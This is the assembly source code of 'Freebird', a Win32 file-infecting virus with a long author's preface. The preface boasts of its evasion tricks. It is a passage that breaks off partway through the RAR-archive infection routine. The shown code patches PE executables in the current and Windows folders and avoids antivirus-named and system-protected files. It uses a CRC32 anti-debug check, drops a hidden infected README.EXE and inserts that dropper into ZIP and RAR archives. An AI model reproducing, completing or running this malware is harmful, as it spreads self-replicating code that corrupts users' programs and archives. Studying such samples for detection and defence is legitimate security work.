
;
; freebird
; Coded by Bumblebee
;
; This is the source code of a VIRUS. The author is in no way
; responsabile of any damage that may occur due its usage.
;
; Some comments:
;
; That's a win32 per-process resident and direct action EPO virus.
;
; It infects only files that have any import from kernel32.dll module
; because this import is used to retrieve k32 address (and needed API).
; It requires API to go back host (restore patched bytes into host code
; section). It won't modify the EP in the PE header, instead patches the
; host code inserting a jmp to the virus. Is not the ultimate EPO but
; works and it's very easy to code, better than nothing :)
;
; It updates the PE checksum of infected PE files using imagehlp.dll
; API. If this API is not available, it still infects (checksum is zero).
;
; It does self integrity check with CRC32. That's a simple but effective
; anti-debug trick and keeps virus pretty safe of hex hacking.
;
; Uses size padding as infection sign.
;
; It won't infect most of av soft looking for the usual stringz in the
; name of the disposable victim (AV, DR, SP, F-, AN, VE, CL, ON).
;
; Has a run-time part that will affect win32 PE files with EXE ext into
; current and windows folders. It skips system protected files (SFC).
; Infecting files into windows folder helps the virus to spread with the
; simple direct action schema. If that fails (due system protected files),
; then the per-process part is there.
;
; It uses kinda mutexes to avoid overload the system with the run-time
; part. Due it uses shared memory by name as mutex, the name is random
; from serial number of c:\ drive and results from CPUID instruction ;)
;
; That name is used to uncompress a dropper and infect it. This file
; will be added to ZIP/RAR archives found in current folder. It will
; skip archives where 1st item is README.EXE (to avoid re-infection).
; It inserts the droper at the begining of the archives instead of
; appending the infected file to the end. Archive infection is a bit
; unoptimized O:) but quite clear to understand it.
;
; Per-process residence is performed as explained in an article released
; in this e-zine. I hook to check for directory changes: PostQuitMessage
; from USER32.DLL.
;
; It will get the needed API using GetProcAddress. And uses SEH to
; avoid crash, it hangs the process when a fatal error occurs (eg. if
; it cannot get the APIs to patch host code, it won't be able to go
; back host). At least won't appear an screen of death ;)
;
; Well, it's a neat virus. That was funny to code, even most parts are
; quite standard. I think that's the 2nd time i don't use crc32 for
; imports (the first one was win95.bumble, my 1st win appender), and is
; just due i was bored of the same crc32 code ever, and 2 facts:
; av stop study of viruses and... who cares with virus size? ;)
;
; I've developed it under win2k and tested under win98. That means it runs
; under windows 2000 without any problem (i cannot say the same about my
; previous 'win32' stuff). You only will notice it if thou get infected under
; such system ;)
;
; Finally i must say i'm in love with NASM, mainly due i have only this
; asm installed (fuck, and it fits in a single floppy: NASM+ALINK+DOCS+LIBS).
;
; Yes, it's Freebird from Lynard Skynard song. Oh Lord, I can't change ;)
; Try to find this song and listen it reading this lame source and, at least
; and may be not at last, you'll listen good music.
;
; That's all. The source code is pretty clear, but we're living bad times
; for the vx. May be this bug is only interesting for a small group of vxers:
; those that are experienced but still can learn something from the bee.
;
; I'm not used to greet ppl, but since i'm lost in combat... here follow
; some:
;
;       Perikles: I miss you, i'll try to met you more often (use fweeder
;                 damnit, don't be afraid of vb huehe)
;         Ratter: Seems now i'm newbie at your side... keep on rocking man
;          Xezaw: We need young blood here... Metele canya pedacho gay!
;    VirusBuster: Too much marulo arround here, uhm XD
; Mental Driller: You're the master, don't fool saying is matter of time
;          Super: Looking forward to see that .NET shit, and your ring0 tute?
;            TCP: Congratulations (he got married?)
;          Vecna: Hey favelado, te veo flojo. Para cuando el fin del mundo?
;         29Aers: You're all alone...
;
; And big cheers to other ppl i used to talk to and now i cannot due i'm
; in the shadows: Yello, Clau, f0re, Zert, Slow, soyuz, TheVoid, Sheroc,
; Tokugawa, Evul, Gigabyte, Wintermute, Malware (where are you?), Griyo,
; Roadkill, Black Jack, star0, Rajaat, ... i cannot remember you, sorry =]
;
;
; If you wanna contact with me, ask someone that can find me.
;
; - main.asm BOF -

[extern ExitProcess]

[segment .text]
[global main]
main:
        lea     esi,[fakeHost]                  ; setup fake 1st gen
        lea     edi,[epobuffTMP]
        mov     ecx,5
        rep     movsb

        lea     edx,[fake_import]
        mov     [__imp__],edx

        mov     eax,400000h
        mov     [baseAddr],eax                  ; def base addr

        lea     esi,[vBegin]
        mov     edi,vSize-4
        call    CRC32
        mov     [myCRC32],eax

        jmp     ventry

fake_import     dd      077e80000h              ; developed under win2k

;
; Since win doesn't implement code protection (via segment, thus under intel
; arch the only way to do it coz pages don't have code/data attrib), that's
; a nice way to 1st gen without external PE patcher.
;
[segment .data]

ventry:
vBegin  equ     $

        push    eax                             ; room for ret addr
        pushad
        pushfd

        call    getDelta

        lea     esi,[vBegin+ebp]
        mov     edi,vSize-4
        call    CRC32                           ; integrity check
        mov     ecx,[myCRC32+ebp]
        sub     ecx,eax
        jecxz   mycrc32ok
        jmp     $
mycrc32ok:

        lea     edi,[startUp+ebp]               ; setup return
        lea     esi,[infectTMP+ebp]             ; stuff saved in
        add     ecx,infectTMPlen                ; infection with anti-debug
        rep     movsb                           ; (ecx must be zero at this
                                                ; point)

        mov     edx,12345678h
__imp__         equ $-4
        mov     esi,[reloc+ebp]
        lea     eax,[vBegin+ebp]
        sub     esi,eax                         ; this virus supports relocs

        add     [baseAddr+ebp],esi              ; fix base addr (reloc)
        add     [hostEP+ebp],esi                ; fix host entry point

        add     edx,esi                         ; use import to find
        mov     edx,[edx]                       ; k32 base address

        xor     eax,eax
        call    seh
        jmp     $                               ; if we're not able to
                                                ; locate k32 we cannot
                                                ; get APIs and jmp back
                                                ; host is not possible
;
; Some stringz for the avers
;
        db      "[ FREEBIRD: I make birds of mud and I throw them to fly ]"
seh:
        push    dword [fs:eax]
        mov     dword [fs:eax],esp

        and     edx,0fffff000h                  ; simple k32 scan
        add     edx,1000h
findK32BaseAddrLoop:
        sub     edx,1000h
        cmp     word [edx],'MZ'
        jne     findK32BaseAddrLoop
        movzx   eax,word [edx+3ch]
        cmp     edx,dword [eax+edx+34h]
        jne     findK32BaseAddrLoop

        mov     [kerneldll+ebp],edx

        xor     eax,eax                         ; remove SEH frame
        pop     dword [fs:eax]
        pop     eax

scanKerneldll:
        mov     ebx,12345678h                   ; get GetProcAddress
kerneldll       equ $-4
        mov     edi,ebx
        mov     esi,edi
        add     esi,3ch
        lodsd
        add     eax,edi
        xchg    eax,esi
        mov     esi,dword [esi+78h]
        add     esi,ebx
        add     esi,1ch
        lodsd

        add     eax,edi
        mov     [address+ebp],eax
        lodsd
        add     eax,edi
        mov     [names+ebp],eax
        lodsd
        add     eax,edi
        mov     [ordinals+ebp],eax

        xor     edx,edx
        lea     esi,[GetProcAddress+ebp]
        mov     ecx,GetProcAddresslen
searchl:
        push    ecx
        push    esi
        mov     edi,[names+ebp]
        add     edi,edx
        mov     edi,[edi]
        add     edi,ebx
        rep     cmpsb
        je      fFound
        add     edx,4
        pop     esi
        pop     ecx
        jmp     searchl
fFound:
        pop     esi
        pop     ecx
        shr     edx,1
        add     edx,[ordinals+ebp]
        movzx   ebx,word [edx]
        shl     ebx,2
        add     ebx,[address+ebp]
        mov     ecx,[ebx]
        add     ecx,[kerneldll+ebp]

getAPI:
        mov     [_GetProcAddress+ebp],ecx

        lea     esi,[API0+ebp]                  ; now get APIs
getAPILoop:
        push    esi
        xor     eax,eax
        lodsb
        push    eax
        add     esi,4

        push    esi
        push    dword [kerneldll+ebp]
        call    dword [_GetProcAddress+ebp]

        pop     ecx
        pop     esi
        mov     [esi+1],eax
        add     esi,ecx
        jecxz   getAPILoopDone
        jmp     getAPILoop
getAPILoopDone:

        xor     eax,eax
        push    eax
        push    eax
        push    eax
        push    eax
        lea     esi,[serialNum+ebp]
        push    esi
        mov     [esi],eax                       ; fix string
        push    eax
        push    eax
        lea     esi,[drive+ebp]
        push    esi
        call    dword [_GetVolumeInformationA+ebp] ; get serial number of
        or      eax,eax                            ; c: drive
        jnz     randomOk

        mov     dword [serialNum+ebp],12345678h ; that's not random!
randomOk:

        xor     eax,eax
        inc     eax
        cpuid                                   ; mutex depends on CPU

        or      eax,edx
        xor     dword [serialNum+ebp],eax       ; fuck you avers! hueheh
                                                ; random? XD

        and     dword [serialNum+ebp],0f0f0f0fh ; build rnd string
        or      dword [serialNum+ebp],"aaaa"

        ; why that pseudo random? we don't want the avers create
        ; their artificial mutex to fool the virus, do we?

        ; check our mutex to avoid overload the system with
        ; several instances of the virus infecting arround
        ; all at the same time...
        xor     eax,eax
        lea     esi,[serialNum+ebp]
        push    esi
        push    dword 1024
        push    eax
        push    dword 4
        push    eax
        dec     eax
        push    eax
        call    dword [_CreateFileMappingA+ebp]
        or      eax,eax
        jz      near failedToLoadDll

        mov     [mutexHnd+ebp],eax

        call    dword [_GetLastError+ebp]       ; already there?
        cmp     eax,0b7h
        je      near closeMutex
        
        lea     esi,[imagehlpdll+ebp]           ; load imagehlp dll
        push    esi
        call    dword [_LoadLibraryA+ebp]
        or      eax,eax
        jz      near closeMutex

        mov     [_imagehlpdll+ebp],eax

        lea     esi,[CheckSumMappedFile+ebp]    ; get API for PE checksum
        push    esi
        push    eax
        call    dword [_GetProcAddress+ebp]

        mov     [_CheckSumMappedFile+ebp],eax

        lea     esi,[sfcdll+ebp]                ; load sfc dll
        push    esi
        call    dword [_LoadLibraryA+ebp]

        mov     [_sfcdll+ebp],eax

        or      eax,eax
        jz      near noSfc

        lea     esi,[SfcIsFileProtected+ebp]    ; get API to avoid sfc
        push    esi
        push    eax
        call    dword [_GetProcAddress+ebp]

noSfc:
        mov     [_SfcIsFileProtected+ebp],eax


        ; hey bumble, remember that must be before any infection!
        call    setupPerProcess                 ; setup per-process
                                                ; hooks

        ; now the run-time part

        lea     esi,[path0+ebp]
        push    esi
        push    dword 260
        call    dword [_GetCurrentDirectoryA+ebp]
        or      eax,eax
        jz      endRuntimePart

        push    dword 260
        lea     esi,[path1+ebp]
        push    esi
        call    dword [_GetWindowsDirectoryA+ebp]
        or      eax,eax
        jz      endRuntimePart

        mov     ecx,eax                         ; if we're yet into
        lea     esi,[path0+ebp]                 ; windows folder, avoid
        lea     edi,[path1+ebp]                 ; infect more files
        rep     cmpsb
        je      endRuntimePart

        call    scandirpe                       ; infect current folder

        lea     esi,[path1+ebp]
        push    esi
        call    dword [_SetCurrentDirectoryA+ebp]
        or      eax,eax
        jz      endRuntimePart

        call    scandirpe                       ; affect windows folder

        lea     esi,[path0+ebp]                 ; go back home
        push    esi
        call    dword [_SetCurrentDirectoryA+ebp]
        
        call    findArchives                    ; self explanatory XD

endRuntimePart:
        mov     eax,[_sfcdll+ebp]               ; free it only if loaded
        or      eax,eax                         ; (of coz hehe)
        jz      sfcNotLoaded

        push    dword [_sfcdll+ebp]
        call    dword [_FreeLibrary+ebp]

sfcNotLoaded:
        push    dword [_imagehlpdll+ebp]        ; good guys release the dlls
        call    dword [_FreeLibrary+ebp]

closeMutex:
        push    dword [mutexHnd+ebp]            ; close the 'mutex'
        call    dword [_CloseHandle+ebp]

failedToLoadDll:
        mov     esi,[hostEP+ebp]
        mov     [esp+24h],esi                   ; put ret addr

        call    dword [_GetCurrentProcess+ebp]  ; patch our process

        lea     edx,[padding+ebp]
        push    edx
        push    dword 5
        sub     edx,-4
        push    edx
        push    dword [hostEP+ebp]
        push    eax
        call    dword [_WriteProcessMemory+ebp]
        or      eax,eax
        jz      $                               ; well... hehehe
                                                ; in fact it failed :P

        ; code modified by epo is restored
        ; just fly away

        popfd
        popad
        ret

; get variables displacement
getDelta:
        call    _getDelta
_getDelta:
        pop     ebp
        sub     ebp,_getDelta
        ret

; does crc32 for self integrity check
CRC32:
        cld
    	xor     ecx,ecx
    	dec     ecx
        mov     edx,ecx
        push    ebx
NextByteCRC:
        xor     eax,eax
        xor     ebx,ebx
        lodsb
        xor     al,cl
        mov     cl,ch
        mov     ch,dl
        mov     dl,dh
        mov     dh,8
NextBitCRC:
        shr     bx,1
        rcr     ax,1
        jnc     NoCRC
        xor     ax,08320h
        xor     bx,0EDB8h
NoCRC:
        dec     dh
        jnz     NextBitCRC
        xor     ecx,eax
        xor     edx,ebx
        dec     edi
        jnz     NextByteCRC
        pop     ebx
        not     edx
        not     ecx
        mov     eax,edx
        rol     eax,16
        mov     ax,cx
        ret

%include "infectpe.inc"
%include "findf.inc"
%include "hooks.inc"
%include "archive.inc"

; our import table
API0                    db      API1-API0
_GetFileAttributesA     dd      0
GetFileAttributesAstr   db      "GetFileAttributesA",0
API1                    db      API2-API1
_SetFileAttributesA     dd      0
SetFileAttributesAstr   db      "SetFileAttributesA",0
API2                    db      API3-API2
_CreateFileA            dd      0
CreateFileAstr          db      "CreateFileA",0
API3                    db      API4-API3
_GetFileSize            dd      0
GetFileSizestr          db      "GetFileSize",0
API4                    db      API5-API4
_GetFileTime            dd      0
GetFileTimestr          db      "GetFileTime",0
API5                    db      API6-API5
_CreateFileMappingA     dd      0
CreateFileMappingAstr   db      "CreateFileMappingA",0
API6                    db      API7-API6
_MapViewOfFile          dd      0
MapViewOfFilestr        db      "MapViewOfFile",0
API7                    db      API8-API7
_UnmapViewOfFile        dd      0
UnmapViewOfFilestr      db      "UnmapViewOfFile",0
API8                    db      API9-API8
_CloseHandle            dd      0
CloseHandlestr          db      "CloseHandle",0
API9                    db      APIa-API9
_SetFileTime            dd      0
SetFileTimestr          db      "SetFileTime",0
APIa                    db      APIb-APIa
_GetCurrentProcess      dd      0
GetCurrentProcessstr    db      "GetCurrentProcess",0
APIb                    db      APIc-APIb
_WriteProcessMemory     dd      0
WriteProcessMemorystr   db      "WriteProcessMemory",0
APIc                    db      APId-APIc
_LoadLibraryA           dd      0
LoadLibraryAstr         db      "LoadLibraryA",0
APId                    db      APIe-APId
_FreeLibrary            dd      0
FreeLibrarystr          db      "FreeLibrary",0
APIe                    db      APIf-APIe
_FindFirstFileA         dd      0
FindFirstFileAstr       db      "FindFirstFileA",0
APIf                    db      API10-APIf
_FindNextFileA          dd      0
FindNextFileAstr        db      "FindNextFileA",0
API10                   db      API11-API10
_FindClose              dd      0
FindClosestr            db      "FindClose",0
API11                   db      API12-API11
_SetCurrentDirectoryA   dd      0
SetCurrentDirectoryAstr db      "SetCurrentDirectoryA",0
API12                   db      API13-API12
_GetCurrentDirectoryA   dd      0
GetCurrentDirectoryAstr db      "GetCurrentDirectoryA",0
API13                   db      API14-API13
_GetWindowsDirectoryA   dd      0
GetWindowsDirectoryAstr db      "GetWindowsDirectoryA",0
API14                   db      API15-API14
_GetLastError           dd      0
GetLastErrorstr         db      "GetLastError",0
API15                   db      API16-API15
_GetVolumeInformationA  dd      0
GetVolumeInformationAs  db      "GetVolumeInformationA",0
API16                   db      API17-API16
_MultiByteToWideChar    dd      0
MultiByteToWideChars    db      "MultiByteToWideChar",0
API17                   db      API18-API17
_GetFullPathNameW       dd      0
GetFullPathNameWs       db      "GetFullPathNameW",0
API18                   db      0
_WriteFile              dd      0
WriteFiles              db      "WriteFile",0


GetProcAddress          db      "GetProcAddress",0
GetProcAddresslen       equ     $-GetProcAddress
_GetProcAddress         dd      0

_sfcdll                 dd      0
sfcdll                  db      "SFC",0
_SfcIsFileProtected     dd      0
SfcIsFileProtected      db      "SfcIsFileProtected",0

_imagehlpdll            dd      0
imagehlpdll             db      "IMAGEHLP",0
_CheckSumMappedFile     dd      0
CheckSumMappedFile      db      "CheckSumMappedFile",0


fmask:                  db      "*.EXE",0

dropName:
drive                   db      'c:\'           ; for getvolume
serialNum               db      0,0,0,0,0

baseAddr                dd      0

; Generated RLE compressed data
drop	db 005h,04dh,05ah,06ch,000h,001h,083h,000h,004h,004h
	db 000h,011h,000h,082h,0ffh,001h,003h,082h,000h,001h
	db 001h,086h,000h,001h,040h,0a3h,000h,001h,070h,083h
	db 000h,02ch,00eh,01fh,0bah,00eh,000h,0b4h,009h,0cdh
	db 021h,0b8h,000h,04ch,0cdh,021h,054h,068h,069h,073h
	db 020h,070h,072h,06fh,067h,072h,061h,06dh,020h,072h
	db 065h,071h,075h,069h,072h,065h,073h,020h,057h,069h
	db 06eh,033h,032h,00dh,00ah,024h,084h,000h,002h,050h
	db 045h,082h,000h,008h,04ch,001h,004h,000h,07ah,0e2h
	db 064h,03dh,088h,000h,006h,0e0h,000h,002h,001h,00bh
	db 001h,08fh,000h,001h,010h,08ch,000h,001h,040h,082h
	db 000h,001h,010h,083h,000h,001h,002h,082h,000h,001h
	db 001h,087h,000h,001h,004h,088h,000h,001h,050h,083h
	db 000h,001h,004h,086h,000h,001h,002h,085h,000h,001h
	db 010h,082h,000h,001h,010h,084h,000h,001h,010h,082h
	db 000h,001h,010h,086h,000h,001h,010h,08ch,000h,001h
	db 030h,082h,000h,001h,056h,09ch,000h,001h,040h,082h
	db 000h,001h,00ah,0d3h,000h,005h,02eh,074h,065h,078h
	db 074h,084h,000h,001h,010h,083h,000h,001h,010h,082h
	db 000h,001h,006h,084h,000h,001h,004h,08eh,000h,001h
	db 020h,082h,000h,008h,060h,049h,04dh,050h,04fh,052h
	db 054h,053h,082h,000h,001h,010h,083h,000h,001h,020h
	db 082h,000h,001h,006h,084h,000h,001h,006h,08eh,000h
	db 001h,060h,082h,000h,008h,060h,069h,06dh,070h,06fh
	db 072h,074h,073h,082h,000h,001h,010h,083h,000h,001h
	db 030h,082h,000h,001h,056h,084h,000h,001h,008h,08eh
	db 000h,001h,040h,082h,000h,007h,050h,072h,065h,06ch
	db 06fh,063h,073h,083h,000h,001h,010h,083h,000h,001h
	db 040h,082h,000h,001h,00ah,084h,000h,001h,00ah,08eh
	db 000h,001h,040h,082h,000h,001h,052h,0ffh,000h,0ffh
	db 000h,0ffh,000h,0fbh,000h,004h,050h,0e8h,0fah,00fh
	db 0ffh,000h,0ffh,000h,0ffh,000h,0ffh,000h,005h,0ffh
	db 025h,040h,030h,040h,0ffh,000h,0ffh,000h,0ffh,000h
	db 0feh,000h,002h,038h,030h,08ah,000h,002h,028h,030h
	db 082h,000h,002h,040h,030h,096h,000h,00ah,06bh,065h
	db 072h,06eh,065h,06ch,033h,032h,02eh,064h,082h,06ch
	db 084h,000h,002h,048h,030h,086h,000h,002h,048h,030h
	db 088h,000h,009h,045h,078h,069h,074h,050h,072h,06fh
	db 063h,065h,082h,073h,0ffh,000h,0ffh,000h,0ffh,000h
	db 0afh,000h,001h,020h,082h,000h,001h,00ah,083h,000h
        db 002h,002h,030h

; That headers thanks to Int13h (or star0?)
RARHeader:                                      ; Header that we will add
RARHeaderCRC    dw 0                            ; We'll fill: CRC of header
RARType         db 074h                         ; File Header
RARFlags        dw 8000h
RARHeadsize     dw FinRARHeader-RARHeader
RARCompressed   dd 0                            ; Compressed and Original
RAROriginal     dd 0                            ; size are the same, we stored
RAROs           db 0                            ; OS: 0 ms-dos?
RARCrc32        dd 0                            ; We must fill this field
RARFileTime     db 0,0                          ; Time of the program
RARFileDate     db 0,0                          ; Date of the proggy
RARNeedVer      db 014h
RARMethod       db 030h                         ; Method: storing
RARFnameSize    dw FinRARHeader-RARName
RARAttrib       dd 20h                          ; archive
RARName         db "README.EXE"                 ; Name of file to drop
FinRARHeader:

; That header thanks to star0
LocalHeader:

ZIPlogsig:      db 50h,4bh,03,04                ; signature
ZIPver:         dw 0ah                          ; ver need to extract
ZIPgenflag:     dw 0                            ; no particulary flag
ZIPMthd:        dw 0                            ; no compression
ZIPTime:        dw 0                            ; aleatory
ZIPDate:        dw 0                            ; aleatory
ZIPCrc:         dd 0                            ; unknown
ZIPSize:        dd 0                            ; unknown
ZIPUncmp:       dd 0                            ; unknown
ZIPFnln:        dw 10                           ; unknown
ZIPXtraLn:      dw 0                            ; unknown
ZIPfileName:    db "README.EXE"

CentralHeader:

ZIPCenSig:      db 50h,4bh,01,02                ; central signature
ZIPCver:        db 0                            ; ver made by
ZIPCos:         db 0                            ; Host Operating -> All
ZIPCvxt:        db 0                            ; Ver need to extract
ZIPCeXos:       db 0                            ; Ver need to extract.
ZIPCflg:        dw 0                            ; No encryption !
ZIPCmthd:       dw 0                            ; Method : Store it !
ZIPCtim:        dw 0                            ; last mod time
ZIPCDat:        dw 0                            ; last mod date
ZIPCCrc:        dd 0                            ; Crc-32 unknown
ZIPCsiz:        dd 0                            ; Compressed size unknown
ZIPCunc:        dd 0                            ; Uncompressed size unkown
ZIPCfnl:        dw 10                           ; filename length unknown
ZIPCxtl:        dw 0                            ; Extra Field length 0
ZIPCcml:        dw 0                            ; file comment length 0
ZIPDsk:         dw 0                            ; Disk number start (?) 0
ZIPInt:         dw 1                            ; Internal file attribute
ZIPExt:         dd 20h                          ; external file attrib
ZIPOfst:        dd 0                            ; relativeoffset local head
ZIPCfileName:   db "README.EXE"


EndOfCentral:


; used at infection stage
infectTMP:
epobuffTMP              dd      0
                        db      0
hostEPTMP               dd      fakeHost
relocTMP                dd      vBegin
infectTMPlen            equ     $-infectTMP

myCRC32                 dd      0
vEnd    equ     $
vSize   equ     (vEnd-vBegin)

; bss data not included into infected files (that's virtual memory)
path0                  times 260 db 0
path1                  times 260 db 0

dropExp                 times 2570 db 0         ; place to uncompress the
                                                ; dropper

address                 dd      0
names                   dd      0
ordinals                dd      0

mutexHnd                dd      0

finddata:
        dwFileAttributes dd     0
        dwLowDateTime0  dd      0
        dwHigDateTime0  dd      0
        dwLowDateTime1  dd      0
        dwHigDateTime1  dd      0
        dwLowDateTime2  dd      0
        dwHigDateTime2  dd      0
        nFileSizeHigh   dd      0
        nFileSizeLow    dd      0
        dwReserved      dd      0,0
        cFileName       times 260 db 0
        cAlternateFilename times 16 db 0

; for sfc shit
wideBuffer              times   260*2 db 0        ; 260 wide chars
wideBuffer2             times   260*2 db 0
dummy                   dd      0

findHnd                 dd      0
chksum                  dd      0,0
fHnd                    dd      0
mapMem                  dd      0
fhmap                   dd      0
fileTime0               dd      0,0
fileTime1               dd      0,0
fileTime2               dd      0,0
fileAttrib              dd      0
fileSize                dd      0

padding                 dd      0               ; those must be joint
startUp:
epobuff                 dd      0
                        db      0
hostEP                  dd      0
reloc                   dd      0

viEnd    equ    $
viSize   equ    (viEnd-vBegin)

fakeHost:
        push    dword 0
        call    ExitProcess

; - main.asm EOF -
; - archive.inc BOF -

fgenmask        db      "*.*",0

;
; Look for archives to add our virus
;
findArchives:

        call    dropTheVirus                            ; drop the virus

        lea     eax,[finddata+ebp]
        push    eax
        lea     eax,[fgenmask+ebp]
        push    eax
        call    dword [_FindFirstFileA+ebp]
        inc     eax
        jz      near notFoundArchive
        dec     eax

        mov     dword [findHnd+ebp],eax

findNextArchive:
        mov     eax,dword [nFileSizeLow+ebp]            ; avoid small
        cmp     eax,2000h                               ; 8 kbs
        jb      near skipThisArchive
        cmp     eax,400000h*2                           ; avoid huge (top 4 mbs)
        ja      near skipThisArchive

        lea     esi,[cFileName+ebp]

        push    esi
UCaseLoopArc:
        cmp     byte [esi],'a'
        jb      notUCaseArc
        cmp     byte [esi],'z'
        ja      notUCaseArc
        sub     byte [esi],'a'-'A'
notUCaseArc:
        lodsb
        or      al,al
        jnz     UCaseLoopArc

        mov     eax,[esi-5]
        pop     esi

        not     eax
        cmp     eax,~".RAR"
        jne     nextArc0
        call    infectRAR
        jmp     skipThisArchive
nextArc0:
        cmp     eax,~".ZIP"
        jne     nextArc1
        call    infectZIP
        jmp     skipThisArchive
nextArc1:

skipThisArchive:
        lea     eax,[finddata+ebp]
        push    eax
        push    dword [findHnd+ebp]
        call    dword [_FindNextFileA+ebp]
        or      eax,eax
        jnz     near findNextArchive

        push    dword [findHnd+ebp]
        call    dword [_FindClose+ebp]

notFoundArchive:
        ret

; uncompress the dropper and infect it
dropTheVirus:
        xor     ecx,ecx                         ; expand the RLEed
        mov     edx,2570                        ; dropper
        lea     esi,[drop+ebp]
        lea     edi,[dropExp+ebp]
expandLoop:
        test    byte [esi],128
        jnz     expRep
        mov     cl,byte [esi]
        and     cl,127
        sub     edx,ecx
        inc     esi
        rep     movsb
        or      edx,edx
        jnz     expandLoop
        jmp     endExpand
expRep:
        mov     cl,byte [esi]
        inc     esi
        lodsb
        and     cl,127
        sub     edx,ecx
        rep     stosb
        or      edx,edx
        jnz     expandLoop
endExpand:

        xor     eax,eax
        push    eax
        push    dword 00000007h                 ; system, read only and hidden
        push    dword 00000001h
        push    eax
        push    eax
        push    dword 40000000h
        lea     esi,[dropName+ebp]              ; that must be initialized
        push    esi                             ; before use it!
        call    dword [_CreateFileA+ebp]
        inc     eax
        jz      skipDrop
        dec     eax

        push    eax

        push    dword 0
        lea     esi,[dummy+ebp]
        push    esi
        push    dword 2570
        lea     esi,[dropExp+ebp]
        push    esi
        push    eax
        call    dword [_WriteFile+ebp]

        call    dword [_CloseHandle+ebp]

        lea     esi,[dropName+ebp]
        call    infectpe

skipDrop:
        ret

; adds the dropper to a RAR archive pointed by esi
infectRAR:
        push    esi

        push    esi
        call    dword [_GetFileAttributesA+ebp]
        pop     esi
        inc     eax
        jz      near infectionErrorRAR
        dec     eax

        mov     dword [fileAttrib+ebp],eax

        push    esi
        push    dword 80h
        push    esi
        call    dword [_SetFileAttributesA+ebp]
        pop     esi
        or      eax,eax
        jz      near infectionErrorRAR

        push    esi

        xor     eax,eax
        push    eax
        push    dword 80h
        push    dword 3
        push    eax
        push    eax
        push    dword (80000000h | 40000000h)
        push    esi
        call    dword [_CreateFileA+ebp]
        inc     eax
        jz      near infectionErrorAttribRAR
        dec     eax

        mov     [fHnd+ebp],eax

        push    dword 0
        push    eax
        call    dword [_GetFileSize+ebp]
        inc     eax
        jz      near infectionErrorCloseRAR
        dec     eax

        mov     [fileSize+ebp],eax

        lea     eax,[fileTime2+ebp]
        push    eax
        add     eax,-8
        push    eax
        add     eax,-8
        push    eax
        push    dword [fHnd+ebp]
        call    dword [_GetFileTime+ebp]
        or      eax,eax
        jz      near infectionErrorCloseRAR

        xor     eax,eax
        push    eax
        push    eax
        push    eax
        push    dword 4
        push    eax
        push    dword [fHnd+ebp]
        call    dword [_CreateFileMappingA+ebp]
        or      eax,eax
        jz      near infectionErrorCloseRAR

        mov     dword [fhmap+ebp],eax

        xor     eax,eax
        push    eax
        push    eax
        push    eax
        push    dword 6
        push    dword [fhmap+ebp]
        call    dword [_MapViewOfFile+ebp]
        or      eax,eax
        jz      near infectionErrorCloseMapRAR

        mov     [mapMem+ebp],eax

        ; don't rely too much on next part XD
        ; using RAR32 for tests

        mov     edx,[eax]
        not     edx
        cmp     edx,~"Rar!"                     ; a RAR archive?
        jne     near infectionErrorCloseMapRAR

        add     eax,14h                         ; skip main header
        cmp     byte [eax+2],74h                ; a RAR header?
        jne     near infectionErrorCloseMapRAR

        mov     edx,[eax+RARName-RARHeader]     ; check if already
        not     edx                             ; infected
        cmp     edx,~"READ"
        jne     RARNotFound
        mov     edx,[eax+RARName-RARHeader+4]
        not     edx
        cmp     edx,~"ME.E"
        je      near infectionErrorCloseMapRAR
RARNotFound:

        ; The RAR file seems ok and it's not infected

        mov     dx,[eax+RARFileTime-RARHeader]  ; less suspicious
        mov     [RARFileTime+ebp],dx
        mov     dx,[eax+RARFileDate-RARHeader]
        mov     [RARFileDate+ebp],dx
        mov     dl,[eax+RAROs-RARHeader]        ; same os
        mov     [RAROs+ebp],dl

        ; now load our droper

        xor     eax,eax
        push    eax
        push    dword 00000007h
        push    dword 00000003h
        push    eax
        push    eax
        push    dword 80000000h
        lea     esi,[dropName+ebp]              ; our dropper
        push    esi
        call    dword [_CreateFileA+ebp]
        inc     eax
        jz      near infectionErrorCloseMapRAR
        dec     eax

        push    eax
        push    dword 0
        push    eax
        call    dword [_GetFileSize+ebp]
        pop     ebx
        inc     eax
        jz      near infectionErrorCloseMapRAR
        dec     eax
        
        add     [fileSize+ebp],eax              ; new size
        add     dword [fileSize+ebp],FinRARHeader-RARHeader

        mov     [RARCompressed+ebp],eax         ; update RAR header
        mov     [RAROriginal+ebp],eax
        
        push    ebx

        xor     eax,eax
        push    eax
        push    eax
        push    eax
        push    dword 2
        push    eax
        push    ebx
        call    dword [_CreateFileMappingA+ebp]
        pop     ebx
        or      eax,eax
        jz      near infectionErrorCloseMapRAR

        push    ebx
        push    eax
        mov     ebx,eax

        xor     eax,eax
        push    eax
        push    eax
        push    eax
        push    dword 4
        push    ebx
        call    dword [_MapViewOfFile+ebp]
        pop     edx
        pop     ebx
        or      eax,eax
        jz      near infectionErrorCloseMapRAR

        push    ebx     ; file hnd
        push    edx     ; file mapping
        push    eax     ; map view of file

        mov     esi,eax
        mov     edi,[RAROriginal+ebp]
        call    CRC32

        mov     [RARCrc32+ebp],eax

        lea     esi,[RARHeader+2+ebp]
        mov     edi,FinRARHeader-RARHeader-2
        call    CRC32

        mov     [RARHeaderCRC+ebp],ax

        push    dword [mapMem+ebp]
        call    dword [_UnmapViewOfFile+ebp]

        push    dword [fhmap+ebp]
        call    dword [_CloseHandle+ebp]

        pop     dword [wideBuffer+ebp]  ; view of file
        pop     dword [wideBuffer+4+ebp]; file mapping
        pop     dword [wideBuffer+8+ebp]; file handle

        xor     eax,eax
        push    eax
        push    dword [fileSize+ebp]
        push    eax
        push    dword 4
        push    eax
        push    dword [fHnd+ebp]
        call    dword [_CreateFileMappingA+ebp]
        or      eax,eax
        jz      near infectionErrorCloseRAR

        mov     [fhmap+ebp],eax

        xor     eax,eax
        push    dword [fileSize+ebp]
        push    eax
        push    eax
        push    dword 6
        push    dword [fhmap+ebp]
        call    dword [_MapViewOfFile+ebp]
        or      eax,eax
        jz      near infectionErrorCloseMapRAR

        mov     [mapMem+ebp],eax

        mov     edi,eax
        add     edi,[fileSize+ebp]              ; end of file
        mov     esi,eax
        add     esi,14h                         ; begin of data
        add     esi,FinRARHeader-RARHeader      ; plus added size
        add     esi,[RAROriginal+ebp]

        mov     ecx,edi                         ; size of data to move
        sub     ecx,esi

        mov     esi,edi
        sub     esi,FinRARHeader-RARHeader
        sub     esi,[RAROriginal+ebp]

        dec     esi
        dec     edi
moveLoopRAR:                                    ; move the data
        lodsb
        sub     esi,2
        stosb
        sub     edi,2
        dec     ecx
        jnz     moveLoopRAR

        mov     edi,[mapMem+ebp]                ; insert our data
        add     edi,14h
        lea     esi,[RARHeader+ebp]
